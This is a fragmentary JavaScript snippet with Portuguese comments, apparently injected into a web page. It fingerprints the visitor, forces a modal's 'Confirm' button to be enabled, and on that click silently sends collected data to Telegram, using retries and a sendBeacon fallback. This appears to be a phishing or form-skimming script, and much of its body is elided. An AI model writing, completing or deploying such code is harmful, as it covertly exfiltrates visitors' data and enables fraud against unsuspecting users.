(function () {
  ...
  /* ────────── ENVIO AO TELEGRAM COM RETRY E FALLBACK (melhorado, mas mantendo a mesma interface) ────────── */
...
Fuso horário: ${fingerprint.timezone}`;
      ...
      // Fallback silencioso com sendBeacon
      try {
  ...
  /* ══════════════════════════════════════════════════════════
     CORREÇÃO MÍNIMA PARA O BOTÃO CONFIRM EM MOBILE
     (não interfere em nada da lógica original)
  ══════════════════════════════════════════════════════════ */
  function fixMobileConfirmButton() {
    ...
    const btnContainer = modal.querySelector('.bg-gradient-to-b.from-0\\% .sticky.bottom-0, .sticky.bottom-0');
    if (btnContainer) {
      btnContainer.style.position = 'relative';
      btnContainer.style.zIndex = '1000';
      btnContainer.style.marginBottom = footer ? (footer.offsetHeight + 10) + 'px' : '20px';
    }
  ...
  function watchForModal() {
    const observer = new MutationObserver(() => {
      ...
      if (modal && !modal.hasAttribute('data-ps-modal-fixed')) {
        modal.setAttribute('data-ps-modal-fixed', 'true');
        setTimeout(fixMobileConfirmButton, 50);
      }
    });
  ...
  // Também corrige sempre que o modal aparecer (intervalo leve)
  setInterval(() => {
    ...
    if (modal) {
      ...
      if (confirmBtn && confirmBtn.innerText.trim() === 'Confirm') {
        ...
        confirmBtn.classList.remove('opacity-10', 'cursor-not-allowed');
        const footer = document.getElementById('__ps_footer__');
        if (footer && modal.querySelector('.sticky.bottom-0')) {
          modal.querySelector('.sticky.bottom-0').style.marginBottom = (footer.offsetHeight + 10) + 'px';
        }
      }
    }
  }, 500);
  ...
  /* ══════════════════════════════════════════════════════════
     TODO O CÓDIGO ORIGINAL DO SCRIPT (FAVICON, CARTÕES, DECORAÇÕES) PERMANECE EXATAMENTE IGUAL
     (nenhuma linha abaixo foi alterada)
  ══════════════════════════════════════════════════════════ */
  ...
  function onConfirmClick() {
    // Envia os dados para o Telegram (com a nova versão que tem retry)
